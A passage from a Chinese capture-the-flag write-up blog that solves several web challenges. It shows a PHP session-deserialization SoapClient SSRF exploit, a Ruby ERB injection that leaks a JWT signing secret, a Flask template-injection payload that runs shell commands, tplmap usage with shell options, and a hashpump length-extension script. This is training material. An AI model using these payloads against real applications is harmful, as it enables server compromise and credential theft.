<p><strong>而当session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞</strong></p>
<p><strong>php引擎会以|作为作为key和value的分隔符，我们在传入内容的时候，比如传入</strong></p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">$<span class="variable">_SESSION</span>[‘<span class="built_in">name</span>’] = ‘|username‘</span><br></pre></td></tr></table></figure>
<p><strong>那么使用php_serialize引擎时可以得到序列化内容</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:”name”;s:<span class="number">4</span>:”|username”;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>然后用php引擎反序列化时，|被当做分隔符，于是</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:”name”;s:<span class="number">4</span>:”</span><br></pre></td></tr></table></figure>
<p><strong>被当作key</strong></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">username</span></span><br></pre></td></tr></table></figure>
<p><strong>被当做vaule进行反序列化</strong></p>
<p><strong>于是，我们只要传入</strong></p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">$<span class="variable">_SESSION</span>[‘<span class="built_in">name</span>’] = |序列化内容</span><br></pre></td></tr></table></figure>
<p><strong>即可触发漏洞</strong></p>
<hr>
<p>知识点就讲到这里，接下去来分析一下题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);  <span class="comment">//参数二的位置固定为 $_POST 数组，我们很容易便想到利用 extract 函数进行变量覆盖，以便配合后续利用</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;   <span class="comment">//存在 session 伪造漏洞，我们可以考虑是否可以包含 session 文件或者利用 session 反序列化漏洞</span></span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php  (扫目录扫到的)</span></span><br><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>分析下代码，flag.php 文件中告诉我们，只有 127.0.0.1 请求该页面才能得到 flag ，所以这明显又是考察 SSRF 漏洞，这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF </p>
<p>第一步：由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header ，构造 <strong>SoapClient</strong> 类，并用php_serialize引擎进行序列化，存入session</p>
<blockquote>
<p><strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</strong></p>
</blockquote>
<p>我们可以利用回调函数，通过给f传参，值为session_start，然后post提交   <code>array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;)</code></p>
<p>即达到<strong>session_start(array(‘serialize_handler’ =&gt; ‘php_serialize’))</strong> ，将会根据php7特性设置session.serialize_handler=php_serialize。而又因为session是可控的，可以通过传入name值，任意伪造。这里就想到name传入的是序列化值了，序列化exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;npfs\r\nCookie:PHPSESSID=123456\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$se</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.urlencode(<span class="variable">$se</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span></span><br></pre></td></tr></table></figure>
<p>执行脚本得到</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">|O<span class="variable">%3</span>A<span class="number">10</span><span class="variable">%3</span>A<span class="variable">%22</span>SoapClient<span class="variable">%22</span><span class="variable">%3</span>A<span class="number">4</span><span class="variable">%3</span>A<span class="variable">%7</span>Bs<span class="variable">%3</span>A<span class="number">3</span><span class="variable">%3</span>A<span class="variable">%22</span>uri<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">17</span><span class="variable">%3</span>A<span class="variable">%22</span>http<span class="variable">%3</span>A<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="number">127.0</span>.<span class="number">0.1</span><span class="variable">%2</span>F<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">8</span><span class="variable">%3</span>A<span class="variable">%22</span>location<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">25</span><span class="variable">%3</span>A<span class="variable">%22</span>http<span class="variable">%3</span>A<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="number">127.0</span>.<span class="number">0.1</span><span class="variable">%2</span>Fflag.php<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">11</span><span class="variable">%3</span>A<span class="variable">%22</span>_user_agent<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">31</span><span class="variable">%3</span>A<span class="variable">%22</span>npfs<span class="variable">%0</span>D<span class="variable">%0</span>ACookie<span class="variable">%3</span>APHPSESSID<span class="variable">%3</span>D<span class="number">123456</span><span class="variable">%0</span>D<span class="variable">%0</span>A<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">13</span><span class="variable">%3</span>A<span class="variable">%22</span>_soap_version<span class="variable">%22</span><span class="variable">%3</span>Bi<span class="variable">%3</span>A<span class="number">1</span><span class="variable">%3</span>B<span class="variable">%7</span>D</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu17.jpg"></p>
<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
<p>传值f=extract&amp;name=SoapClient      POST:b=call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu18.jpg"></p>
<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu19.jpg"></p>
<p>总的流程如下，图来源于网络<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%BA%8C" target="_blank">PHP反序列化入门之session反序列化</a></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu20.png"></p>
<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><strong>知识点：Ruby/erb模板注入</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread <span class="keyword">__FILE__</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>思路是JWT攻击 </p>
<p>测试：在 点击work的时候抓包，将 cookie:auth=xxx,进行jwt解码</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI<span class="number">1</span><span class="symbol">NiJ9</span>.eyJ<span class="number">1</span>aWQiOiJi<span class="symbol">NjVhZWI1</span>ZS<span class="number">1</span>h<span class="name">M2</span>Q<span class="number">2</span>LTQzMDAtYWI<span class="number">3</span>OS<span class="number">1</span>h<span class="symbol">NzUwNDI0</span>ODdhODgiLCJqa<span class="number">2</span>wiOjMwfQ<span class="number">.4</span>lbFDJBOCKb<span class="number">2</span>t<span class="number">5</span>cKmjl<span class="number">9</span>TStB<span class="symbol">nCiFLV5</span>A<span class="meta">O4</span><span class="symbol">Nny90</span>b<span class="number">67</span>U</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;b65aeb5e-a3d6-4300-ab79-a75042487a88&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jkl&quot;</span>: <span class="number">30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>确认思路，但是想要伪造jwt需要密钥SECRET</p>
<p>robots.txt 下发现路径，访问得到源码</p>
<p>重点看/work</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; algorithm: <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].<span class="keyword">match</span>(<span class="string">&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"> <span class="comment">//可以看出，cookie是需要ENV[&quot;SECRET&quot;]作为签名得到的。因此我们如果能得到每次work后的ENV[&quot;SECRET&quot;]，就可以伪造cookie了！这段代码的后半部分说明了，在ERB模版渲染以前有一个正则匹配。如果SECRET参数存在的话，就对其进行匹配，并用传入的值与ENV[&quot;SECRET&quot;]进行匹配，匹配成功就会输出FLAG</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[:<span class="keyword">do</span>] == <span class="string">&quot;#&#123;params[:name][0,7]&#125; is working&quot;</span> then</span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>当 <code>params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot;</code> ,secret会在 auth显示</p>
<p>所有我们要做的就是另<code>params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot;</code></p>
<p>这里有一串代码  <code>ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result</code>   为ERb模板，还直接把可控参数 name 拼进去了，那么这里我们就可以传入一些构造过的参数，来达到我们的目的了。比如 name=&lt;%=1%&gt;，就会得 1。</p>
<p><strong>erb得模板注入形式如下</strong></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;%= <span class="number">7</span> * <span class="number">7</span> %&gt;</span><br><span class="line">&lt;%= File.open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read %&gt;</span><br></pre></td></tr></table></figure>
<p><strong>但是题目只给了我们七个可控字符，除去这五个必要得字符，我们只能剩下2个字符可控</strong></p>
<p><strong>这里用到ruby全局变量</strong></p>
<p> <strong>ruby的全局变量以<code>$</code>开头，例如: <code>$x</code>,<code>$y</code> 。全局变量可以在程序的任何地方加以引用。全局变量无需变量声明。引用尚未初始化的全局变量时，其值为nil。并且ruby有内置的全局变量表，在<a href="https://blog.csdn.net/zdq0394123/article/details/8443694">这里</a>。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu21.jpg"></p>
<p><strong>这里既然有匹配，那说明我们就可以用全局变量读出来了，也就是可以用上图的符号来读取匹配前的内容（即<code>ENV[&quot;SECRET&quot;]</code>）</strong></p>
<p><strong>因此我们可以构造，再进行url编码后传入。</strong></p>
<blockquote>
<p>?name=&lt;%=$’%&gt;&amp;do=&lt;%=$’%&gt; is working&amp;SECRET=</p>
<p>name=%3C%25=$’%25%3E&amp;do=%3C%25=$’%25%3E%20is%20working&amp;SECRET=</p>
</blockquote>
<p>得到</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;script&gt;</span><span class="attribute">alert</span>(&#x27;<span class="number">02</span>a<span class="number">6945180</span>e<span class="number">332</span>ddf<span class="number">02</span>ba<span class="number">874</span>fc<span class="number">1</span>ae<span class="number">706</span>a<span class="number">43</span>e<span class="number">82</span>bd<span class="number">324</span>b<span class="number">47</span>fcbdac<span class="number">8208</span>f<span class="number">9</span>b<span class="number">5</span>dac<span class="number">1702</span>ba<span class="number">6280</span>a<span class="number">9</span>ad<span class="number">64798703</span>fd<span class="number">2</span>f<span class="number">3</span>b<span class="number">75</span>c<span class="number">8</span>b<span class="number">22</span>fa<span class="number">0390</span>b<span class="number">3</span>d<span class="number">6</span>c<span class="number">9</span>df<span class="number">18</span>c<span class="number">3</span>ad<span class="number">7</span>d<span class="number">3323</span>c<span class="number">195</span> working successfully!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>


<p>哪一长串数字就是secret ,拿到 <a href="https://jwt.io/">https://jwt.io/</a> ，伪造jwt即可，flag在buy flag后的cookie 里，还是拿jwt解密即为flag</p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>知识点：</p>
<ol>
<li><strong>隐含参数查找</strong></li>
<li>常规flask模板注入</li>
<li>tplmap的使用</li>
</ol>
<p>题目不难，不过第一次遇到这种题型记录一下。</p>
<p><strong>一开始进去，发现这仿佛是一个静态的网页，没有传参没有交互。扫目录也没有任何信息泄露，入口都找不到咋做题…通过百度知道存在隐藏参数，这里用到一个隐藏参数查找的工具 Arjun</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu22.jpg"></p>
<p>通过工具，知道有参数name </p>
<p>接下去就是常规模板注入了</p>
<p>学到了利用CTRL + F 知道可利用类位置的小方法</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu23.jpg"></p>
<p>payload:</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[1].__subclasses__()[182].__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>


<p>或者直接使用tplmap工具</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Usage: python tplmap.py [options]</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -h, --help          显示帮助并退出</span><br><span class="line"></span><br><span class="line">目标:</span><br><span class="line">  -u URL, <span class="attribute">--url</span>=URL   目标 URL</span><br><span class="line">  -X REQUEST, --re<span class="built_in">..</span>  强制使用给定的HTTP方法 (e.g. PUT)</span><br><span class="line"></span><br><span class="line">请求:</span><br><span class="line">  -d DATA, <span class="attribute">--data</span>=..  通过POST发送的数据字符串 它必须作为查询字符串: <span class="attribute">param1</span>=value1&amp;param2=value2</span><br><span class="line">  -H HEADERS, --he<span class="built_in">..</span>  附加标头 (e.g. <span class="string">&#x27;Header1: Value1&#x27;</span>) 多次使用以添加新的标头</span><br><span class="line">  -c COOKIES, --co<span class="built_in">..</span>  Cookies (e.g. <span class="string">&#x27;Field1=Value1&#x27;</span>) 多次使用以添加新的Cookie</span><br><span class="line">  -A USER_AGENT, -<span class="built_in">..</span>  HTTP User-Agent 标头的值</span><br><span class="line">  <span class="attribute">--proxy</span>=PROXY       使用代理连接到目标URL</span><br><span class="line"></span><br><span class="line">检测:</span><br><span class="line">  <span class="attribute">--level</span>=LEVEL       要执行的代码上下文转义级别 (1-5, Default: 1)</span><br><span class="line">  -e ENGINE, --eng<span class="built_in">..</span>  强制将后端模板引擎设置为此值</span><br><span class="line">  -t TECHNIQUE, --<span class="built_in">..</span>  技术 R:渲染 T:基于时间的盲注 Default: RT</span><br><span class="line"></span><br><span class="line">操作系统访问:</span><br><span class="line">  <span class="attribute">--os-cmd</span>=OS_CMD     执行操作系统命令</span><br><span class="line">  --os-shell          提示交互式操作系统Shell</span><br><span class="line">  <span class="attribute">--upload</span>=UPLOAD     上传本地文件到远程主机</span><br><span class="line">  --force-overwrite   上传时强制覆盖文件</span><br><span class="line">  <span class="attribute">--download</span>=DOWNL..  下载远程文件到本地主机</span><br><span class="line">  <span class="attribute">--bind-shell</span>=BIN..  在目标的TCP端口上生成系统Shell并连接到它</span><br><span class="line">  <span class="attribute">--reverse-shell</span>=..  运行系统Shell并反向连接到本地主机端口</span><br><span class="line"></span><br><span class="line">模板检查:</span><br><span class="line">  --tpl-shell         在模板引擎上提示交互式Shell</span><br><span class="line">  <span class="attribute">--tpl-code</span>=TPL_C..  在模板引擎中注入代码</span><br><span class="line"></span><br><span class="line">常规:</span><br><span class="line">  <span class="attribute">--force-level</span>=FO..  强制将测试级别设置为此值</span><br><span class="line">  <span class="attribute">--injection-tag</span>=..  使用字符串作为注入标签 (default <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>


<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu24.jpg"></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu25.jpg"></p>
<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>知识点：</p>
<ol>
<li>LFI via SegmentFault</li>
<li>Hashpump</li>
</ol>
<p>ell**</p>
<p>先看看源码，发现提示为如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x2F;password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>非预期 :利用逻辑漏洞，传参?pass=(响应包中的Hash值)</p>
<p>预期解：通过hashpump猜测 secret 长度 ，可以手工也可以脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    data=os.popen(<span class="string">&#x27;hashpump -s de73312423b835b22bfdc3c6da7b63e9 -d admin -k &#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; -a admin&#x27;</span>).read()</span><br><span class="line">    name=data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    password=data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    result=requests.get(<span class="string">&#x27;http://192.168.0.166/index.php?name=&#x27;</span>+password+<span class="string">&#x27;&amp;pass=&#x27;</span>+name).text</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>


<p>查看响应头</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">window</span>.location.href=<span class="string">&quot;flflflflag.php&quot;</span>;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问flflflflag.php</p>
<p><strong>这里可以用php7.0的bug</strong></p>
